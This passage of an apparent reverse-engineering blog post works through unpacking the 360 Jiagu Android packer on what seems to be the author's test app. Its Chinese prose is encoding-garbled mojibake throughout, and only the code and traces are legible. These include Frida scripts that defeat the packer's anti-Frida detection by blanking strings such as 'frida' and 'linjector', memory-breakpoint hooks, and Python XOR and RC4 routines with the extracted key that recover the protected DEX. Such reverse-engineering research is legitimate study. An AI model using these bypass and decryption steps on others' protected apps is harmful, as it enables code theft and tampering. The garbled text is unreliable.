å‘ä¸‹çœ‹æ‰¾åˆ°è¿™ä¸€ä¸ªå‡½æ•° sub_18FEA8 åœ¨è¿™ä¸ªå‡½æ•°ä¸­çš„å­—ç¬¦ä¸²å…¨éƒ¨éƒ½æ˜¯åŠ å¯†çš„ï¼Œé¢‡æœ‰ç§æ­¤åœ°æ— é“¶ä¸‰ç™¾ä¸¤çš„æ„Ÿè§‰ï¼Œæˆ‘ä»¬æŠŠå­—ç¬¦ä¸²è§£å¯†åå‘ç°äº† DexFileLoader ç›¸å…³çš„å­—ç¬¦ä¸²ï¼Œè¯´æ˜è¿™ä¸ªå‡½æ•°è‚¯å®šå’ŒåŠ è½½ dex æœ‰æŸç§å…³è” æˆ‘ä»¬ hook ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°è¿™ä¸ªå‡½æ•°å…±è°ƒç”¨äº†ä¸‰æ¬¡ï¼Œè€Œä¸”ä¼ å…¥çš„å€¼éƒ½æ˜¯å·²ç»è§£å¯†äº†çš„ dex, classes.dex , classes2.dex , classes3.dex åˆ†åˆ«é€šè¿‡è¿™ä¸ªå‡½æ•°åŠ è½½ classes.dex classes2.dex classes3.dex æŠŠè¿™ä¸‰ä¸ª dex ç»™ dump ä¸‹æ¥çœ‹çœ‹ï¼Œäºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¿™ä¸‰ä¸ªæ–‡ä»¶ æŠŠæœ€å¤§çš„é‚£ä¸ª dex æ‹–åˆ° jadx åˆ†æé‡Œé¢ï¼Œå‘ç°è¿™æ­£æ˜¯æˆ‘ä»¬è¦æ‰¾çš„ä¸» DEX å…¶ä»–å‡½æ•°éƒ½å¾ˆæ­£å¸¸ï¼Œå”¯ç‹¬ onCreate å‡½æ•°å˜æˆäº† native å£°æ˜ï¼Œè¦æ˜¯æœ‰åŒæ ·åˆ†æåˆ°è¿™é‡Œçš„æœ‹å‹å¯ä»¥å»ç ”ç©¶ç ”ç©¶ onCreate å‡½æ•°å¯¹åº”çš„ native æœ¬åœ°å‡½æ•°ç©¶ç«Ÿåœ¨ä»€ä¹ˆåœ°æ–¹ï¼Œç›¸ä¿¡æœ‰äº†æœ¬æ–‡çš„é“ºå«ï¼Œå¯¹äºè¿›è¡Œåç»­ onCreate å‡½æ•°çš„åˆ†æåº”è¯¥æ˜¯æœ‰æ‰€å¸®åŠ©çš„å§ï½ è€Œé™¤æ­¤ä¹‹å¤–çš„åˆ«çš„ç±»å’Œç›´æ¥åç¼–è¯‘æœªåŠ å›ºçš„ apk çš„ç±»æ˜¯ä¸€æ ·çš„ # ä¸» DEX è§£å¯†ç®—æ³•åˆ†æ æˆ‘ä»¬åœ¨åŠ å›ºå£³åè°ƒè¯•æ·±å…¥åˆ†ææˆåŠŸçš„ç»•è¿‡äº† 360 åŠ å›ºçš„ frida æ£€æµ‹ï¼Œç°åœ¨æˆ‘ä»¬å†æ¬¡å›åˆ° sub_1332B8 ä¸­çš„ sub_128D44 , æ¥è¿›è¡Œåç»­çš„è§£å¯†ç®—æ³•çš„åˆ†æ ä¸‹å›¾æ˜¯ä¸» DEX è§£å¯†æµç¨‹åˆæ­¥åˆ†ææœ«å°¾éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘ä»¬å°†ä»¥è¿™ä¸ªå‡½æ•° sub_128D44 ä¸ºèµ·ç‚¹è¿›è¡Œè§£å¯†ç®—æ³•çš„åˆ†æï¼Œå› ä¸ºå‚æ•° v8 ä¼ å…¥çš„å€¼æ˜¯åŠ å¯†ä¹‹åçš„ä¸» DEX æˆ‘ä»¬åœ¨è¿™ä¸ªå†…å­˜ç”¨ frida æ‰“ä¸€ä¸ªå†…å­˜è¯»å†™æ–­ç‚¹æ¥çœ‹çœ‹æ˜¯ç©¶ç«Ÿæ˜¯ä»€ä¹ˆå‡½æ•°è¯»å–äº†ä¸» DEX, åŒæ—¶éœ€è¦æ³¨æ„åŠ ä¸Šæˆ‘ä»¬çš„åè°ƒè¯•å‡½æ•° var so_name = \"libjiagu_64.so\";function hook_dex_dec_enter_in_main_elf()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1346B4), &#123; onEnter: function (args) &#123; //memory breakpoint MemoryAccessMonitor.enable( &#123; base:this.context.x0.add(0x8), size:40 &#125;,&#123; onAccess: function (details) &#123; console.log(details.operation) console.log(get_addr_in_so(details.from)); &#125; &#125; ) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;var zlib_count=0function hook_zlib()&#123; Interceptor.attach(Module.findExportByName(null, \"inflate\"), &#123; // fd, buff, len onEnter: function (args) &#123; zlib_count+=1 if(zlib_count===2)&#123; hook_dex_dec_enter_in_main_elf(); &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;function anti_frida_check()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x1770C), &#123; onEnter: function (args) &#123; try&#123; var s = this.context.x6.readCString(); if (s.indexOf('frida')!==-1 || s.indexOf('gum-js-loop')!==-1 || s.indexOf('gmain')!==-1 || s.indexOf('linjector')!==-1 || s.indexOf('/proc/')!==-1)&#123; //console.log(s) Memory.protect(this.context.x0, Process.pointerSize, 'rwx'); var replace_str=\"\" for(var i=0;i&lt;s.length;i++)&#123; replace_str+=\"0\" &#125; this.context.x0.writeUtf8String(replace_str); &#125; &#125; catch (e)&#123; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;function get_addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return addr.toString(16)+\" is in \"+process_Obj_Module_Arr[i].name+\" offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16); &#125; &#125; return addr.toString(16);&#125;function hook_dlopen() &#123; //hook_call_constructors(); Interceptor.attach(Module.findExportByName(null, \"android_dlopen_ext\"), &#123; onEnter: function (args) &#123; var pathptr = args[0]; if (pathptr !== undefined &amp;&amp; pathptr != null) &#123; var path = ptr(pathptr).readCString(); console.log(\"dlopen \"+path); if (path.indexOf(so_name) >= 0) &#123; this.is_can_hook = true; &#125; &#125; &#125;, onLeave: function (retval) &#123; if (this.is_can_hook) &#123; //you can do any thing before stalker trace so //trace_so(); hook_zlib(); anti_frida_check(); //hook_C918(); &#125; &#125; &#125; );&#125;setImmediate(hook_dlopen);æ‰“å°æ—¥å¿—å¦‚ä¸‹ è¯´æ˜æ˜¯åœ¨ 0xd364 å¤„è¯»å–äº†è¿™ä¸ªä¸» DEX è·³è½¬åˆ° 0xd364 ä¹‹åå‘ç°è¿™ä¸ªåœ°å€åœ¨å‡½æ•° sub_C918 ä¸­ï¼Œçœ‹èµ·æ¥è¿™ä¸ªå‡½æ•°çš„å½¢çŠ¶åƒä¸€ä¸ªç«è½¦å¤´ä¸€æ · XD æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­ä½¿ç”¨ staker_trace_so ç”Ÿæˆçš„ trace_so() å‡½æ•°å»çœ‹çœ‹å‡½æ•°çš„è°ƒç”¨é“¾æ˜¯ä»€ä¹ˆæ ·å­çš„ï¼Œtrace çš„èµ·ç‚¹å°±æ˜¯åœ¨ sub_1332B8 ä¸­çš„ sub_128D44 , åŒæ—¶æ³¨æ„åŠ ä¸Šæˆ‘ä»¬çš„åè°ƒè¯•å‡½æ•° æ‰“å°å‡ºæ¥çš„å‡½æ•°è°ƒç”¨é“¾å¦‚ä¸‹ start Stalker!Stalker end!(mainELF)call1:sub_128D44(mainELF)call2:j_interpreter_wrap_int64_t(mainELF)call3:interpreter_wrap_int64_t(KEkeELF)call4:interpreter_wrap_int64_t_bridge(KEkeELF)call5:getenv(KEkeELF)call6:sub_13908(KEkeELF)call7:inotify_add_watch(KEkeELF)call8:sub_11220(KEkeELF)call9:fopen(KEkeELF)call10:sub_9DD8(KEkeELF)call11:sub_E3E0(KEkeELF)call12:strtol(KEkeELF)call13:feof(KEkeELF)call14:raise(KEkeELF)call15:memset(KEkeELF)call16:sub_C918// è¿™ä¸ªå‡½æ•°ä¸­è¯»å–åŠ å¯†ä¹‹åçš„ dex(KEkeELF)call17:sub_9964(KEkeELF)call18:sub_9AC4(KEkeELF)call19:sub_9988(KEkeELF)call20:j_ffi_prep_cif(KEkeELF)call21:ffi_prep_cif(KEkeELF)call22:j_ffi_prep_cif_machdep(KEkeELF)call23:ffi_prep_cif_machdep(KEkeELF)call24:j_ffi_call(KEkeELF)call25:ffi_call(KEkeELF)call26:sub_1674C(KEkeELF)call27:j_ffi_call_SYSV(KEkeELF)call28:ffi_call_SYSV(KEkeELF)call29:sub_167BC(KEkeELF)call30:sub_1647C(KEkeELF)call31:sub_163DC(mainELF)call32:_Znwm(mainELF)call33:malloc(mainELF)call34:sub_128D64(KEkeELF)call35:sub_9E58(KEkeELF)call36:j_lseek_1(KEkeELF)call37:lseek(KEkeELF)call38:sub_A3EC(KEkeELF)call39:sub_99CC(KEkeELF)call40:sub_9944(KEkeELF)call41:sub_999C(mainELF)call42:sub_128D70(mainELF)call43:memcpy(mainELF)call44:sub_14283C(mainELF)call45:j__Znwm(mainELF)call46:sub_1429CC(mainELF)call47:sub_142FE0(KEkeELF)call48:sub_10964(KEkeELF)call49:sub_9D60(mainELF)call50:sub_143008(mainELF)call51:sub_142ABC(mainELF)call52:sub_142EA0(mainELF)call53:sub_143A38(mainELF)call54:sub_11CF8C(mainELF)call55:sub_12047C(mainELF)call56:strlen(mainELF)call57:memcmp(mainELF)call58:sub_117B68(KEkeELF)call59:sub_166C4(KEkeELF)call60:memcpy(mainELF)call61:sub_143848(mainELF)call62:sub_1B66A8(mainELF)call63:pthread_mutex_lock(mainELF)call64:sub_143B48(mainELF)call65:sub_1B66D0(mainELF)call66:pthread_mutex_unlock(mainELF)call67:sub_143088(mainELF)call68:sub_11F768(mainELF)call69:j__ZdlPv(mainELF)call70:_ZdlPv(mainELF)call71:free(mainELF)call72:sub_1178E8(mainELF)call73:sub_1222D0(mainELF)call74:sub_14316C(mainELF)call75:sub_142954(KEkeELF)call76:_Z9__arm_a_2PcmS_Rii(KEkeELF)call77:j_interpreter_wrap_int64_t(KEkeELF)call78:interpreter_wrap_int64_t(KEkeELF)call79:sub_9FFC(KEkeELF)call80:j_lseek_3(KEkeELF)call81:j_lseek_2(KEkeELF)call82:sub_9A90(mainELF)call83:sub_142894(mainELF)call84:sub_1428BC(mainELF)call85:sub_127DCC(mainELF)call86:sub_14292C(mainELF)call87:sub_14285C(KEkeELF)call88:j_lseek_0(mainELF)call89:_Znam(mainELF)call90:sub_128E88(mainELF)call91:_ZdaPv(mainELF)call92:sub_142AA4(mainELF)call93:sub_142A10(mainELF)call94:sub_12036C(mainELF)call95:sub_1B6680(mainELF)call96:pthread_mutex_destroy(mainELF)call97:sub_131D58(mainELF)call98:sub_11F3A4(mainELF)call99:sub_18FEA8// è¿™ä¸ªå‡½æ•°ä¸­ä¼ å…¥è§£å¯†ä¹‹åçš„ dex, ä½ç½®å¦‚ä¸‹å›¾æ‰€ç¤º è¿½è¸ªå‡½æ•°è°ƒç”¨é“¾ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸¤ä¸ªæœ‰è¶£çš„å‡½æ•° (mainELF)call50:sub_143008(mainELF)call51:sub_142ABCsub_143008 çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªè§£å¯†çš„å‡½æ•°ï¼Œå…ˆåŠ ä¸Š 0x70 å†å¼‚æˆ– 0x36, æˆ‘ä»¬ hook ä¸€ä¸‹ä¼ å…¥çš„å‚æ•°çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ æˆ‘ä»¬å†å»çœ‹çœ‹åŠ å¯†çš„ dex, å‘ç°è¿™ä¸ªå‡½æ•°ä¼ å…¥çš„å°±æ˜¯åŠ å¯†çš„ä¸» dex æŠŠè¿™éƒ¨åˆ†è§£å¯†çœ‹çœ‹é‡Œé¢æ˜¯ä»€ä¹ˆå†…å®¹ with open('ke_classes.dex', 'rb') as f: s = f.read()dexA = s[0x31A4:0x31A4 + 0x41E]dexA = bytearray(dexA)for i in range(len(dexA)): dexA[i] = ((dexA[i] + 0x70) ^ 0x36)&amp;0xffwith open('dexA.dex','wb') as f: f.write(dexA)ç®€å•çœ‹äº†çœ‹ï¼Œ APPKEY , activityName ç­‰ç­‰åƒæ˜¯ä¸€äº›é…ç½®ä¿¡æ¯çš„æ ·å­ è¿™éƒ¨åˆ†å†…å®¹è§£å¯†å®Œä¹‹åï¼Œåœ¨ sub_142ABC ä¸­ä»¥ pk ä¸ºæ ‡å¿—è¯»å–å„ä¸ªé…ç½®ä¿¡æ¯ ä¹‹åæˆ‘ç»§ç»­ä¸€ä¸ªä¸€ä¸ªè·³è½¬åˆ°æ‰“å°å‡ºæ¥çš„å‡½æ•°ä¸­çœ‹ï¼Œå´ä¸€ç›´éƒ½æ²¡æœ‰å‘ç°åç»­éƒ¨åˆ†çš„è§£å¯†ç®—æ³•çš„èº«å½±ï¼Œéšåæˆ‘åˆä»”ç»†çš„çœ‹äº†ä¸€ä¸‹è°ƒç”¨çš„å‡½æ•°ï¼Œçªç„¶æœ‰äº†æƒŠå–œçš„å‘ç°ï¼Œè¿™é‡Œçš„ pthread_mutex_lock ä¸å°±æ„å‘³ç€è¦ç”¨äº’æ–¥é”æ¥åˆ‡æ¢åˆ°å¦å¤–ä¸€ä¸ªçº¿ç¨‹äº†å—ï¼ï¼Ÿ (mainELF)call61:sub_143848(mainELF)call62:sub_1B66A8(mainELF)call63:pthread_mutex_lock(mainELF)call64:sub_143B48(mainELF)call65:sub_1B66D0(mainELF)call66:pthread_mutex_unlockæˆ‘ä»¬ hook ä¸€ä¸‹ sub_143848 , å¹¶åŒæ—¶æ‰“å°å‡º pid æ¥çœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ æœä¸å…¶ç„¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°é™¤äº†ä¸»çº¿ç¨‹å¤–ï¼Œè¿˜æœ‰ä¸‰ä¸ªä¸åŒçš„çº¿ç¨‹è°ƒç”¨äº†è¿™ä¸ªå‡½æ•° é‚£æˆ‘ä»¬åœ¨ pid å’Œä¸»çº¿ç¨‹ä¸åŒçš„æ—¶å€™ï¼Œç”¨ stalker_trace_so çš„ trace_so å‡½æ•°åœ¨å»çœ‹çœ‹ç©¶ç«Ÿè°ƒç”¨äº†ä»€ä¹ˆå‡½æ•°å§ var stalker_trace_once = false;function hook_thread()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x143848), &#123; onEnter: function (args) &#123; if(main_thread!==Process.getCurrentThreadId())&#123; if(!stalker_trace_once)&#123; stalker_trace_once = true; trace_so(); &#125; &#125; &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;æ‰“å°å‡ºçš„å†…å®¹å¦‚ä¸‹ main thread 9434start Stalker!, pid: 9472Stalker end! (mainELF)call1:sub_1B66A8(mainELF)call2:pthread_mutex_lock(mainELF)call3:sub_143B48(mainELF)call4:memcmp(mainELF)call5:sub_142EA0(mainELF)call6:sub_143A38(mainELF)call7:sub_1B66D0(mainELF)call8:pthread_mutex_unlock(KEkeELF)call9:memset(KEkeELF)call10:inotify_add_watch(KEkeELF)call11:sub_9AC4(KEkeELF)call12:j_ffi_prep_cif(KEkeELF)call13:ffi_prep_cif(KEkeELF)call14:j_ffi_prep_cif_machdep(KEkeELF)call15:ffi_prep_cif_machdep(KEkeELF)call16:j_ffi_call(KEkeELF)call17:ffi_call(KEkeELF)call18:fopen(KEkeELF)call19:sub_1674C(KEkeELF)call20:j_ffi_call_SYSV(KEkeELF)call21:ffi_call_SYSV(KEkeELF)call22:sub_167BC(KEkeELF)call23:sub_1647C(KEkeELF)call24:sub_163DC(mainELF)call25:sub_1178E8(KEkeELF)call26:sub_9988(mainELF)call27:sub_1236B8(mainELF)call28:strlen(mainELF)call29:sub_1222D0(mainELF)call30:sub_128D70(mainELF)call31:memcpy(KEkeELF)call32:getenv(KEkeELF)call33:sub_9E58(KEkeELF)call34:j_lseek_1(KEkeELF)call35:lseek(mainELF)call36:sub_1A1AE8(mainELF)call37:j_strcmp(mainELF)call38:strcmp(mainELF)call39:sub_19F7C4(mainELF)call40:j__Znwm(mainELF)call41:_Znwm(mainELF)call42:malloc(mainELF)call43:sub_1A1B64(KEkeELF)call44:sub_9964(mainELF)call45:sub_1A1B7C(mainELF)call46:memset(mainELF)call47:sub_1A1D84(mainELF)call48:sub_1A1E74(mainELF)call49:j_j__ZdlPv_12(mainELF)call50:j__ZdlPv(mainELF)call51:_ZdlPv(mainELF)call52:free(mainELF)call53:sub_18DC28(mainELF)call54:sub_18DC4C(KEkeELF)call55:sub_9FFC(mainELF)call56:sub_19B7EC(mainELF)call57:mmap(KEkeELF)call58:sub_A3EC(KEkeELF)call59:sub_9944(mainELF)call60:sub_18DCC0(mainELF)call61:sub_18F6AC(mainELF)call62:sub_18DDA8(mainELF)call63:sub_18DD94(mainELF)call64:sub_18DDB8(mainELF)call65:sub_18E8D0(mainELF)call66:sub_18E244(mainELF)call67:j_j__ZdlPv_5(mainELF)call68:sub_129468(mainELF)call69:sub_12D478(mainELF)call70:sub_1A19EC(KEkeELF)call71:raise(KEkeELF)call72:j_lseek_2(KEkeELF)call73:sub_9A90(KEkeELF)call74:j_lseek_0(KEkeELF)call75:j_lseek_3(mainELF)call76:sub_19BC9C(mainELF)call77:sub_11CF8C(mainELF)call78:sub_131D58(mainELF)call79:memmoveç»§ç»­è·Ÿç€è°ƒç”¨çš„å‡½æ•°ä¸€å¤„ä¸€å¤„åˆ° ida é‡Œé¢çœ‹ï¼Œåœ¨ä¸‹é¢çš„å‡½æ•°ä¸­æˆ‘ä»¬ç»ˆäºæœ‰äº†æ”¶è· (mainELF)call45:sub_1A1B7C(mainELF)call46:memset(mainELF)call47:sub_1A1D84(mainELF)call48:sub_1A1E74è¿™ä¸ªç®—æ³•ï¼Œçœ‹èµ·æ¥åˆæ˜¯ RC4 å‘ hook ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œå‘ç°å¯†é’¥æ˜¯ b&quot;\\x68\\x76\\x99\\x72\\x96\\x60\\x9f\\x63\\x96\\x2c\\x98\\x30\\xc2\\x36\\x51\\x42&quot; å†å» hook sub_1A1E74 çœ‹çœ‹ä¼ å…¥äº†ä»€ä¹ˆæ•°æ®ï¼Œæˆ‘ä»¬å‘ç°å‰ä¸‰éƒ¨åˆ†éƒ½æ˜¯ f7 4f e8 0e å¼€å¤´çš„ çœ‹åˆ°è¿™äº›æ•°æ®ï¼Œç»ˆäºç¦»æˆåŠŸåˆæ›´è¿›ä¸€æ­¥äº†ï¼Œå› ä¸ºè¿™äº›æ•°æ®å°±æ˜¯æˆ‘ä»¬è¯»å–å®Œå£³ DEX å°¾éƒ¨çš„å‰ 0x41E ä¸ªåŠ å¯†æ•°æ®å¹¶è§£å¯†å‡ºé…ç½®ä¿¡æ¯ä¹‹åçš„é‚£éƒ¨åˆ†åŠ å¯†æ•°æ®ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ 010editor ä¸­é€šè¿‡æœç´¢å£³ DEX æ‰¾åˆ°å®ƒä»¬ï¼Œè¿™ä¸‰éƒ¨åˆ†åŠ å¯†æ•°æ®æ®µæ‰€åœ¨çš„ä½ç½®åˆ†åˆ«ä¸º 0x35CE , 0x3A93AD , 0x417064 æˆ‘ä»¬å…ˆæ¥åˆ°ç¬¬ä¸€ä¸ªæ•°æ®æ®µçš„ä½ç½®æ¥åˆ†ææ•°æ®æ®µçš„ç»“æ„ï¼Œè¿™ä¸ªä½ç½®æ˜¯åœ¨ 0x31A4+0x41E , å³ 0x35c2 ä¹‹å æ‰€ä»¥è¿™ dex çš„ç¬¬ä¸€ä¸ªè§£å¯†ç®—æ³•å¦‚ä¸‹ def RC4(data, key): S = list(range(256)) j = 0 out = [] # KSA Phase for i in range(256): j = (j + S[i] + key[i % len(key)]) % 256 S[i], S[j] = S[j], S[i] # PRGA Phase i = j = 0 count = 1 for ch in data: i = (i + 1) % 256 j = (j + S[i]) % 256 S[i], S[j] = S[j], S[i] out.append(ch ^ S[(S[i] + S[j]) % 256]) return outdef RC4decrypt(ciphertext, key): return RC4(ciphertext, key)key = b\"\\x68\\x76\\x99\\x72\\x96\\x60\\x9f\\x63\\x96\\x2c\\x98\\x30\\xc2\\x36\\x51\\x42\"with open('com.oacia.apk_protect/classes.dex', 'rb') as f: enc_data = f.read()start = 0x35C2dexcount = int.from_bytes(enc_data[start:start+4],'little')start+=4for i in range(dexcount): total_data_len = int.from_bytes(enc_data[start:start+4],'little') start+=4 rc4_data_len = int.from_bytes(enc_data[start:start+4],'little') start+=4 enc_dex = enc_data[start:start+rc4_data_len] start+=rc4_data_len dec_dex = RC4decrypt(enc_dex,key) dec2_data_len = int.from_bytes(dec_dex[9:13],'little') with open(f'dex&#123;i+1&#125;.dex','wb') as f: f.write(bytes(dec_dex)) extra = enc_data[start:start+total_data_len-rc4_data_len] extra_data_base = int.from_bytes(dec_dex[5:9], 'little') extra_data_len = len(extra) start+=total_data_len-rc4_data_len-4 print(f\"part&#123;i + 1&#125;: total_data_len: &#123;hex(total_data_len)&#125;, rc4_data_len: &#123;hex(rc4_data_len)&#125;\") print(f\"rc4_dec_part&#123;i + 1&#125;: extra_data_base: &#123;hex(extra_data_base)&#125;,extra_data_len: &#123;hex(extra_data_len)&#125;, dec2_data_len: &#123;hex(dec2_data_len)&#125;\") with open(f'dex&#123;i+1&#125;_extra.dex','wb') as f: f.write(bytes(extra)) ä½†æ˜¯å…‰è¿™è¿˜ä¸å¤Ÿï¼Œå› ä¸º rc4 è§£å¯†å‡ºæ¥çš„æ•°æ®ä»ç„¶ä¸æ˜¯ DEX æ ¼å¼ ä¹‹åç»§ç»­è·Ÿç€å‡½æ•°è°ƒç”¨é“¾èµ°ï¼Œæ‰¾åˆ°è¿™äº›å‡½æ•° (mainELF)call60:sub_18DCC0(mainELF)call61:sub_18F6AC(mainELF)call62:sub_18DDA8(mainELF)call63:sub_18DD94(mainELF)call64:sub_18DDB8åœ¨ sub_18F6AC ä¸­çš„ä»£ç æ„Ÿè§‰å¾ˆåƒæ˜¯ç®—æ³•ç›¸å…³ é€šè¿‡ hook å…¶ä¸­çš„ sub_18DDB8 å‡½æ•°å‘ç° a3 æ˜¯ rc4 è§£å¯†ä¹‹åçš„ä» 0xc å¼€å§‹çš„æ•°æ®æ®µ è€Œå‰é¢çš„ 0xc ä½é¢å¤–æ•°æ®çš„è¯»å–æ–¹å¼ä¸º 5+4+4, åœ¨ sub_18DCC0 ä¸­æœ‰è¯»å–æ“ä½œï¼Œé€šè¿‡è¿™æ ·çš„è¯»å–æ“ä½œæˆ‘ä»¬å¯ä»¥ä¾æ¬¡å¾—åˆ° 0x010000005D , 0x400000 , 0x109492 è¿™é‡Œçš„ 0x109492 è¡¨ç¤ºçš„æ˜¯ç¬¬äºŒæ¬¡è§£å¯†çš„æ•°æ®æ®µçš„å¤§å°ï¼Œé‚£ä¹ˆ 0x40000 è¡¨ç¤ºä»€ä¹ˆå‘¢ï¼Ÿ è¿˜è®°å¾—æˆ‘ä»¬çš„åŠ å¯†æ•°æ®æ®µæ˜¯æœ‰å‰åä¸¤éƒ¨åˆ†çš„å˜›ï¼Œå‰åŠéƒ¨åˆ†ç”¨ rc4 è§£å¯†ï¼Œé‚£ä¹ˆååŠéƒ¨åˆ†æˆ‘ä»¬æ¥çœ‹çœ‹é•¿ä»€ä¹ˆæ ·å­å¥½äº† ååŠéƒ¨åˆ†çš„æ•°æ®çœ‹èµ·æ¥ååˆ†çš„è§„æ•´ï¼Œä¸åƒæ˜¯æœ‰åŠ å¯†çš„æ ·å­ è€Œåœ¨ä¸» DEX åŠ è½½æµç¨‹åˆ†æä¸­ï¼Œæˆ‘ä»¬æˆåŠŸçš„ dump å‡ºäº†ä¸» DEX, é‚£ä¹ˆæˆ‘ä»¬ä¸å¦¨æŠŠè¿™ä¸ªè¿™é‡Œçš„æ•°æ®åˆ°ä¸» DEX ä¸­æœç´¢ä¸€ç•ªçœ‹çœ‹æœ‰ä»€ä¹ˆå‘ç°å§ åœ¨ä¸» DEX ä¸­æœç´¢ç¬¬ä¸€è¡Œçš„å­—èŠ‚ï¼Œæˆ‘ä»¬æƒŠå–œçš„å‘ç°ç«Ÿç„¶å¯ä»¥æœç´¢åˆ°ï¼Œå¹¶ä¸”å®ƒçš„ä½ç½®æ­£å¥½å°±æ˜¯ 0x400000 ! æ‰€ä»¥è¯´ç»è¿‡ RC4 è§£å¯†ä¹‹åçš„è¿™éƒ¨åˆ†çš„æ•°æ®ç»“æ„æˆ‘ä»¬ä¹Ÿå°±å¯ä»¥çŸ¥é“äº† æ¥ä¸‹æ¥æˆ‘ä»¬åªè¦ææ¸…æ¥šåœ¨ sub_18DDB8 ä¸­ç¬¬äºŒæ¬¡è§£å¯†çš„ç®—æ³•æ˜¯ä»€ä¹ˆå°±å¯ä»¥äº† æˆ‘ä»¬å†å›åˆ°åˆ†æçš„èµ·ç‚¹ sub_128D44 å‡½æ•°ï¼Œæ¥çœ‹çœ‹èƒ½ä¸èƒ½æœ‰å…¶ä»–çš„å‘ç° é€šè¿‡ hook sub_128D44 çš„è¿”å›å€¼ v150 ä¹‹åå‘ç°ï¼Œä¸‰çº§æŒ‡é’ˆæŒ‡å‘ç€è§£å¯†ä¹‹åçš„ dex console.log(hexdump(ptr(ptr(ptr(this.context.x0.readS64()).add(0x0).readS64()).readS64()), &#123; offset: 0,// ç›¸å¯¹åç§» length: 0x40,//dump çš„å¤§å° header: true, ansi: true&#125;)); è€Œå€˜è‹¥æˆ‘ä»¬è§‚å¯Ÿè¿™ä¸ªè§£å¯†æ•°æ®æ‰€åœ¨çš„å†…å­˜ 703bc75000 , å®ƒæ­£å¥½æ˜¯ 0x1000 çš„å€æ•°ï¼Œè€Œ 0x1000 æ­£å¥½å°±æ˜¯ä¸€é¡µçš„å¤§å° è¿™æ„å‘³ç€ä»€ä¹ˆå‘¢ï¼Ÿ è¿™è¯´æ˜ dex æ‰€åœ¨çš„å†…å­˜ææœ‰å¯èƒ½æ˜¯é€šè¿‡ mmap å‡½æ•°åˆ†é…çš„ï¼ è€Œåœ¨ stalker_trace_so æ‰“å°çš„æ•°æ®ä¸­ï¼Œæ­£å¥½å°±æœ‰è¿™ä¸ªå‡½æ•°è¢«è°ƒç”¨äº† (mainELF)call57:mmapäºæ˜¯æˆ‘ä»¬æ¥åˆ° mmap è¢«è°ƒç”¨çš„å‡½æ•° ä½¿ç”¨ frida hook mmap è¿”å›çš„å†…å­˜æŒ‡é’ˆï¼Œç„¶åæ‰“ä¸Šå†…å­˜è¯»å†™æ–­ç‚¹ï¼Œå°±å¯ä»¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿå®šä½åˆ°æœ€ç»ˆè§£å¯†ç®—æ³•å®Œæˆä¹‹åèµ‹å€¼çš„åœ°å€ function hook_mmap()&#123; var module = Process.findModuleByName(\"libjiagu_64.so\"); Interceptor.attach(module.base.add(0x19B81C), &#123; // fd, buff, len onEnter: function (args) &#123; console.log(\"mmap!\") console.log(this.context.x0); MemoryAccessMonitor.enable( &#123; base:this.context.x0, size:30 &#125;,&#123; onAccess: function (details) &#123; console.log(details.operation) console.log(get_addr_in_so(details.from)); &#125; &#125; ) &#125;, onLeave: function (ret) &#123; &#125; &#125;);&#125;function get_addr_in_so(addr)&#123; var process_Obj_Module_Arr = Process.enumerateModules(); for(var i = 0; i &lt; process_Obj_Module_Arr.length; i++) &#123; if(addr>process_Obj_Module_Arr[i].base &amp;&amp; addr&lt;process_Obj_Module_Arr[i].base.add(process_Obj_Module_Arr[i].size))&#123; return addr.toString(16)+\" is in \"+process_Obj_Module_Arr[i].name+\" offset: 0x\"+(addr-process_Obj_Module_Arr[i].base).toString(16); &#125; &#125; return addr.toString(16);&#125;åœ¨ 0x18ebd4 ä¸­å°†å€¼å†™å…¥æœ€ç»ˆçš„ç›®æ ‡å†…å­˜ï¼Œè¿™ä¸ªåœ°å€åœ¨ sub_18E8D0 ä¸­ åœ¨è¿™ä¸ªå‡½æ•°çš„å¼€å¤´ï¼Œæœ‰å¯¹å‚æ•° a1 çš„è¯»å–æ“ä½œ æˆ‘ä»¬ hook ä¸€ä¸‹å€¼æ¥çœ‹çœ‹ a1 å„ä¸ªéƒ¨åˆ†éƒ½æœ‰ä»€ä¹ˆå«ä¹‰ ç»™ a1 å†™ä¸€ä¸ªç»“æ„ä½“å¥½äº† struct dec2_struct&#123; long long shift_bit;// ç§»ä½çš„ä½æ•° int reversed0; int reversed1; long long constA; long long dest;// è§£å¯†åçš„ dex å­˜å‚¨çš„åœ°å€ long long constB; long long constC; long long index; long long extra_dex_base;// é¢å¤–æ•°æ®å°†è¦å¤åˆ¶åˆ°çš„åŸºå€ int guess_count2; int reversed2; int flag; int key[4]; int reversed3; int reversed4; int reversed5; int data_len;// è®°å½•é¢å¤–æ•°æ®çš„é•¿åº¦ int input_read_index;// è®°å½•è¯»å–è¾“å…¥çš„åŠ å¯†æ•°æ®çš„ä¸‹æ ‡ unsigned char data[0x112];// è®°å½•é¢å¤–æ•°æ®&#125;æœ€åå¸¦ç€æˆ‘ä»¬çš„ç»“æ„ä½“é€›é€›è¿™ä¸ªè§£å¯†ç®—æ³•çš„å‡½æ•°å¥½å’¯ sub_18F6AC sub_18DDB8 sub_18E244 